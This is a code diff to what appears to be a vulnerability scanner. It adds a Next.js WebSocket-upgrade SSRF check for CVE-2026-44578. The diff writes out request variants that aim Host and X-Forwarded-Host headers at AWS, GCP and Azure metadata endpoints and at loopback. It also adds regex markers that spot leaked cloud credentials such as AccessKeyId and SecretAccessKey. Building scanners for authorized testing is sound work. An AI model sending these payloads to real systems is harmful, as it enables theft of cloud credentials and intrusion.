@@ -51,6 +51,8 @@ _CVE_TO_CLASS: dict[str, str] = {
     "CVE-2026-44789": "prototype_pollution",
     "CVE-2026-44790": "prototype_pollution",
     "CVE-2026-44791": "prototype_pollution",
+    # 2026 H2 Next.js WebSocket Upgrade SSRF
+    "CVE-2026-44578": "nextjs_ws_upgrade_ssrf",
 }
 
 
@@ -256,6 +258,89 @@ def _proto_variants(baseline: str, canary: str, action_id: str) -> list[dict[str
     return variants
 
 
+def _nextjs_ws_ssrf_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
+    """Next.js WebSocket Upgrade SSRF — CVE-2026-44578.
+
+    Server-side proxy upgrade fetches the Host without filtering loopback
+    or cloud-metadata addresses. Sweep the four canonical metadata Hosts
+    plus a Collaborator placeholder.
+    """
+    variants: list[dict[str, Any]] = []
+    # AWS IMDS via WS upgrade
+    variants.append({
+        "label": "ws_ssrf.aws_imds",
+        "method": "GET",
+        "headers": {
+            "Host": "169.254.169.254",
+            "Upgrade": "websocket",
+            "Connection": "upgrade",
+            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+            "Sec-WebSocket-Version": "13",
+            "X-Praetor-Canary": canary,
+        },
+        "body": "",
+    })
+    # GCP metadata
+    variants.append({
+        "label": "ws_ssrf.gcp_metadata",
+        "method": "GET",
+        "headers": {
+            "Host": "metadata.google.internal",
+            "Upgrade": "websocket",
+            "Connection": "upgrade",
+            "Metadata-Flavor": "Google",
+            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+            "Sec-WebSocket-Version": "13",
+            "X-Praetor-Canary": canary,
+        },
+        "body": "",
+    })
+    # Azure IMDS
+    variants.append({
+        "label": "ws_ssrf.azure_imds",
+        "method": "GET",
+        "headers": {
+            "Host": "169.254.169.254",
+            "Upgrade": "websocket",
+            "Connection": "upgrade",
+            "Metadata": "true",
+            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+            "Sec-WebSocket-Version": "13",
+            "X-Praetor-Canary": canary,
+        },
+        "body": "",
+    })
+    # Loopback
+    variants.append({
+        "label": "ws_ssrf.loopback",
+        "method": "GET",
+        "headers": {
+            "Host": "127.0.0.1",
+            "Upgrade": "websocket",
+            "Connection": "upgrade",
+            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+            "Sec-WebSocket-Version": "13",
+            "X-Praetor-Canary": canary,
+        },
+        "body": "",
+    })
+    # X-Forwarded-Host variant (some proxies trust this)
+    variants.append({
+        "label": "ws_ssrf.xfh_imds",
+        "method": "GET",
+        "headers": {
+            "X-Forwarded-Host": "169.254.169.254",
+            "Upgrade": "websocket",
+            "Connection": "upgrade",
+            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+            "Sec-WebSocket-Version": "13",
+            "X-Praetor-Canary": canary,
+        },
+        "body": "",
+    })
+    return variants
+
+
 def _generic_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
     """Fallback when CVE class is unknown: encoding-chain mutations on
     operator-supplied baseline. Hard-bounded by max_variants caller cap."""
@@ -288,6 +373,7 @@ _GENERATORS: dict[str, Any] = {
     "nextjs_cache_poisoning":  _nextjs_cache_variants,
     "trpc_sspp":               _trpc_variants,
     "prototype_pollution":     _proto_variants,
+    "nextjs_ws_upgrade_ssrf":  _nextjs_ws_ssrf_variants,
     "generic":                 _generic_variants,
 }
 
@@ -310,6 +396,16 @@ _SSPP_MARKERS = (
     re.compile(r"TypeError"),
     re.compile(r"Cannot (read|set|convert).*prototype", re.I),
     re.compile(r"constructor.prototype"),
+)
+_WS_SSRF_MARKERS = (
+    re.compile(r"iam/security-credentials", re.I),
+    re.compile(r"\bAccessKeyId\b"),
+    re.compile(r"\bSecretAccessKey\b"),
+    re.compile(r"\bx-google-metadata-request\b", re.I),
+    re.compile(r"computeMetadata/v1", re.I),
+    re.compile(r"\bmetadata\.google\.internal\b", re.I),
+    re.compile(r"\bcompute\.metadata\.azure\.com\b", re.I),
+    re.compile(r'"InstanceProfile"', re.I),
 )
 
 
@@ -338,6 +434,8 @@ def _score_response(klass: str, canary: str, status: int, headers_blob: str,
         markers = _NEXT_CACHE_MARKERS
     elif klass in ("trpc_sspp", "prototype_pollution"):
         markers = _SSPP_MARKERS
+    elif klass == "nextjs_ws_upgrade_ssrf":
+        markers = _WS_SSRF_MARKERS
 
     hits = []
     for pat in markers:
